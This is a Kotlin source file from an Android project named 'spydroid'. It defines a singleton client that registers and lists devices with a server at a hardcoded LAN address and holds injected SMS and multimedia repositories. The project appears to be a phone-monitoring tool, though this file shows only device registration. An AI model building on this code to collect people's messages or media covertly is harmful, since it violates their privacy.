/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote

import android.annotation.SuppressLint
import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import net.spydroid.common.remote.data.dataModule
import net.spydroid.common.remote.domain.DevicesRepository
import net.spydroid.common.remote.domain.InfoRepository
import net.spydroid.common.remote.domain.MultimediaRepository
import net.spydroid.common.remote.domain.SmsRepository
import net.spydroid.common.remote.network.models.Devices
import net.spydroid.common.remote.network.networkModule
import org.koin.android.ext.koin.androidContext
import org.koin.core.component.KoinComponent
import org.koin.core.component.inject
import org.koin.core.context.startKoin
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class RemoteDataProvider private constructor(
    private val context: Context
) : KoinComponent {

    private val devicesRepository: DevicesRepository by inject()
    private val infoRepository: InfoRepository by inject()
    private val multimediaRepository: MultimediaRepository by inject()
    private val smsRepository: SmsRepository by inject()

    private val retrofit = Retrofit.Builder()
        .baseUrl("http://192.168.100.70:8080/")
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val scope = CoroutineScope(Dispatchers.IO)

    init {
        startKoin {
            androidContext(context)
            modules(networkModule, dataModule)
        }
    }

    private val _devices = MutableStateFlow(mutableListOf<Devices>())
    val devices: StateFlow<List<Devices>> = _devices

    fun setDevice(device: Devices) =
        scope.launch {
            devicesRepository.insertDevice(device)
        }


    // GET
    fun searchAllDevices() =
        scope.launch {
            devicesRepository.getAllDevices().map {
                val updateList = _devices.value.toMutableList().apply {
                    add(it)
                }
                _devices.value = updateList
            }
        }


    companion object {
        @SuppressLint("StaticFieldLeak")
        @Volatile
        private var INSTANCE: RemoteDataProvider? = null

        fun current(context: Context): RemoteDataProvider =
            INSTANCE ?: synchronized(this) {
                INSTANCE ?: RemoteDataProvider(context.applicationContext)
                    .also { INSTANCE = it }
            }
    }

}